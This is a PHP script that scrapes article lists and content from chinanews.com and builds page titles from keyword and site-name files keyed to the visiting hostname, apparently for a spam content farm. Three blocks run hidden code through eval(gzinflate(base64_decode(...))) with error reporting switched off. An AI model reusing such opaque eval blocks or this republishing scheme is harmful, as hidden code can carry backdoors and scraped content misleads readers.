<?php
//decode by �ɼ������� QQ:1304957432 
error_reporting(0);

$host = $_SERVER['HTTP_HOST'];

$host_prx = fanjiexi($_SERVER['HTTP_HOST']);

eval(gzinflate(base64_decode('jdTPSsMwHAfw8wZ7hx4G3WC2erX4JOIha7OmXZaO/KEU8WF8Ak+KMkUZ86CMMRgoePMg4sWjB1GwSf84aAq9NPn+SJoPadLuFHDEjAMDUAqSnskQRCIwB4bpiyhUnRgSJIDs8SARsk0EhrINAxBllbRHxoD4aqJXPPtOp91pd+US6QqqZYcUEK+3OzDcSBDey4r9/pEayuKAu8jIqn3jWNZaLmDQKGD7aaHVFRSnLzQR59N9247j2HJRQACBMbPcaGKzyA0gTyyG+ASbjpozwsCXkxjKC8NUzwNZenifva7nq3vTMWy7CGrt1pBCMHa2HNm2NGPEEcWeFuGHFcTV9/VjiShCPYLApgqV9AqiUSxethRZqFHkB6PhXqjBWkZc/SKrxeysZBShhqFOZcNzMY0oZ1oETyqI5dvmt0QUoQahrkQzBCQcUg4CMkl7WkuCK5bNx91TaSlCjSW/ls002WAtI6xuyc1ya0uKUM/I/gmNIWq4njKuUk5vz/8peahQPDgCAvOGx8OlEcY7MtvysWfpLo1XoTx/rueXP+t5dmm+LsrTevIH')));


$list = get_list($url, $flag);

eval(gzinflate(base64_decode('09dXycksLlGwVSguKYovSi3ISUxO1VBQLy8v10vOyMxLzEstL9ZLzs9VV9BRUFLJyC8uUQKyIJo0rQE=')));


$articles_list = str_replace('<div class="dd_lm"></div> <div class="dd_bt">', '', $list);

$articles_list = preg_replace('#</div><div class="dd_time">([\s\S]*?)</div>#', '', $articles_list);


$urls = get_urls($articles_list);

//print_r($urls);


function http_request($url, $timeout = 30, $header = array())
{

	if (!function_exists('curl_init')) {

		throw new Exception('server not install curl');

	}

	$ch = curl_init();

	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

	curl_setopt($ch, CURLOPT_HEADER, true);

	curl_setopt($ch, CURLOPT_URL, $url);

	curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);

	if (!empty($header)) {

		curl_setopt($ch, CURLOPT_HTTPHEADER, $header);

	}

	$data = curl_exec($ch);

	list($header, $data) = explode("\r\n\r\n", $data);

	$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);

	if ($http_code == 301 || $http_code == 302) {

		$matches = array();

		preg_match('/Location:(.*?)\n/', $header, $matches);

		$url = trim(array_pop($matches));

		curl_setopt($ch, CURLOPT_URL, $url);

		curl_setopt($ch, CURLOPT_HEADER, false);

		$data = curl_exec($ch);

	}


	if ($data == false) {

		curl_close($ch);

	}

	@curl_close($ch);

	return $data;

}


function get_list($url, $type)
{

	$html = file_get_contents($url);

	preg_match_all('#<li><div([\s\S]*?)</div></li>#', $html, $list);

	$list = $list[0];

	$list = preg_replace('#\[([\s\S]*?)\]#is', '', $list);

eval(gzinflate(base64_decode('41TJySwuUbBVKC4pii9KLchJTE7VUNdXV9BTUCmpLEgF0kCejoJ6RklJgZW+fnl5uV5yRmZeYl5qebFecn4uplKwiZrWvFy8XJxYTcdlFG4r8NoPtxEA')));

	//$list = str_replace( '.shtml' , '.html' , $list );

	$arr = array();

	$c = 0;

	for ($i = 0; $i < count($list); $i++) {

		if (!strstr($list[$i], '/shipin/') && !strstr($list[$i], '/tp/')) {

			$arr[$c] = $list[$i];

			$c++;

		}

	}

	$list = $arr;

	return $arr;

}


function get_title($html)
{

	preg_match_all('# <h1 style="display:block; position:relative; text-align:center; clear:both">([\s\S]*?)</h1>#', $html, $title);

	$title = $title[0];

	$title = $title[0];

	$title = str_replace(' <h1 style="display:block; position:relative; text-align:center; clear:both">', '', $title);

	$title = str_replace('</h1>', '', $title);

	$title = trim($title);

	return $title;

}


function get_time_from($html)
{

	preg_match_all('#<div class="left-t" style="padding-left:6px;">([\s\S]*?)<img#', $html, $time_from);

	$time_from = $time_from[0];

	$time_from = $time_from[0];

	$time_from = str_replace('<div class="left-t" style="padding-left:6px;">', '', $time_from);

	$time_from = str_replace('<img', '', $time_from);

	$time_from = trim($time_from);

	return $time_from;

}


function get_content($html, $url_pre)
{

	preg_match_all('#<div id="tupian_div"([\s\S]*?)<div id="function_code_page"></div>#', $html, $content);

	$content = $content[0];

	$content = preg_replace('#<table(.*)</table>#is', '', $content);

	$content = preg_replace('#<div id="tupian_div"([\s\S]*?)</div>#', '', $content);

	$content = preg_replace('#<!--([\s\S]*?)-->#', '', $content);

	$content = preg_replace("#(\r\n|\r|\t)#i", '', $content);

	$content = preg_replace('#<img([\s\S]*?)src="[^/|^h]#', '<img src="' . $url_pre . 'U', $content);

	$content = preg_replace('#<img([\s\S]*?)src="/#', '<img src="http://www.chinanews.com/', $content);

	$content = preg_replace('#<a target=([\s\S]*?) >([\s\S]*?)</a>#', '', $content);


	$content = $content[0];

	$content = str_replace('<div id="function_code_page">', '', $content);

	return $content;

}


function get_keywords($html)
{

	preg_match_all('#<meta name="keywords" content="([\s\S]*?)" />#', $html, $keywords);

	$keywords = $keywords[0];

	$keywords = $keywords[0];

	$keywords = str_replace('<meta name="keywords" content="', '', $keywords);

	$keywords = str_replace('" />', '', $keywords);

	return $keywords;

}


function get_descriptions($html)
{

	preg_match_all('#<meta name="description" content="([\s\S]*?)" />#', $html, $descriptions);

	$descriptions = $descriptions[0];

	$descriptions = $descriptions[0];

	$descriptions = str_replace('<meta name="description" content="', '', $descriptions);

	$descriptions = str_replace('" />', '', $descriptions);

	return $descriptions;

}


function titlename($str_25, $str_26 = 0)
{

	$str_27 = explode('c3c', $str_25);

	//$str_28 =explode('', file_get_contents('newskeywords.txt'));

	$str_28 = file('newskeywords.txt');

	//$str_34 =explode('', file_get_contents('webname.txt'));

	$str_34 = file('webname.txt');


	if (count($str_27) == 2) {

		if (preg_match('/^[a-z\s]+$/', substr($str_27[0], 0, 2))) {

			$str_35 = entonum(substr($str_27[0], 0, 1));

			$str_42 = entonum(substr($str_27[0], 1, 1));

			$str_44 = substr($str_27[0], 2, strlen($str_27[0]) - 2);

			if (!preg_match('/^[0-9\s]+$/', $str_44)) {

				$str_44 = $str_42;

			}

		} else {

			$str_35 = entonum(substr($str_27[0], 0, 1));

			$str_42 = entonum(substr($str_27[0], 1, 1));

			$str_44 = entonum(substr($str_27[0], 2, 1));

		}

	} else {

		$str_35 = entonum(substr($str_27[0], 0, 1));

		$str_42 = entonum(substr($str_27[0], 1, 1));

		$str_44 = entonum(substr($str_27[0], 2, 1));

	}

	if ($str_26 == 1) {

		echo trim($str_34[$str_44]) . '������';

	} elseif ($str_26 == 2) {

		echo trim($str_28[$str_35]);

	} else {

		echo trim($str_28[$str_35]) . '-' . trim($str_28[$str_42]) . '-' . trim($str_34[$str_44]) . '������';

	}

}

function entonum($str_45)
{

	if (!is_numeric($str_45)) {

		$str_45 = strtolower($str_45);

	}

	switch ($str_45) {

		case 'a':
			$str_45 = '0';

			break;

		case 'b':
			$str_45 = '1';

			break;

		case 'c':
			$str_45 = '2';

			break;

		case 'd':
			$str_45 = '3';

			break;

		case 'e':
			$str_45 = '4';

			break;

		case 'f':
			$str_45 = '5';

			break;

		case 'g':
			$str_45 = '6';

			break;

		case 'h':
			$str_45 = '7';

			break;

		case 'i':
			$str_45 = '8';

			break;

		case 'j':
			$str_45 = '9';

			break;

		case 'k':
			$str_45 = '10';

			break;

		case 'l':
			$str_45 = '11';

			break;

		case 'm':
			$str_45 = '12';

			break;

		case 'n':
			$str_45 = '13';

			break;

		case 'o':
			$str_45 = '14';

			break;

		case 'p':
			$str_45 = '15';

			break;

		case 'q':
			$str_45 = '16';

			break;

		case 'r':
			$str_45 = '17';

			break;

		case 's':
			$str_45 = '18';

			break;

		case 't':
			$str_45 = '19';

			break;

		case 'u':
			$str_45 = '20';

			break;

		case 'v':
			$str_45 = '21';

			break;

		case 'w':
			$str_45 = '22';

			break;

		case 'x':
			$str_45 = '23';

			break;

		case 'y':
			$str_45 = '24';

			break;

		case 'z':
			$str_45 = '25';

			break;

		case '1':
			$str_45 = '26';

			break;

		case '2':
			$str_45 = '27';

			break;

		case '3':
			$str_45 = '28';

			break;

		case '4':
			$str_45 = '29';

			break;

		case '5':
			$str_45 = '30';

			break;

		case '6':
			$str_45 = '31';

			break;

		case '7':
			$str_45 = '32';

			break;

		case '8':
			$str_45 = '33';

			break;

		case '9':
			$str_45 = '34';

			break;

	}

	return $str_45;

}


function fanjiexi($str_24, $str_23 = 1)
{

	$str_7 = array('.com.cn', '.com.hk', '.cn.com', '.gov.cn', '.com', '.net', '.cn', '.org', '.me', '.name', '.info', '.xyz', '.cc', '.la', '.wang', '.im', '.io', '.co', '.tw', '.tm', '.mobi', '.asia', '.hk', '.aero', '.ca', '.us', '.fr', '.se', '.ie', '.tv', '.biz', '.pro', '.in', '.nu', '.ch', '.ws', '.be');

	$str_8 = substr($str_24, -8, 8);

	for ($str_29 = 0; $str_29 <= 36; $str_29++) {

		if (strpos($str_8, $str_7[$str_29])) {

			$str_24 = str_replace($str_7[$str_29], "", $str_24);

			$str_9 = explode('.', $str_24);

			if (count($str_9) == 2 && $str_9[0] == 'www' && $str_23 == 1) {

				$str_24 = "";

			} else {

				$str_24 = str_replace($str_9[count($str_9) - 1], "", $str_24);

				$str_24 = str_replace('.', "", $str_24);

			}

			break;

		}

	}

	return $str_24;

}


function get_rand($start, $end, $num)
{

	$connt = 0;

	while ($connt < $num) {

		$a[] = rand($start, $end);

		$ary = array_unique($a);

		$connt = count($ary);

	}

	return $ary;

}


function get_urls($list)
{

	$urls = str_replace('<li><a href="', '', $list);

	$urls = preg_replace('#">([\s\S]*?)</a></li>#', '', $urls);

	//print_r($urls);

	return $urls;

}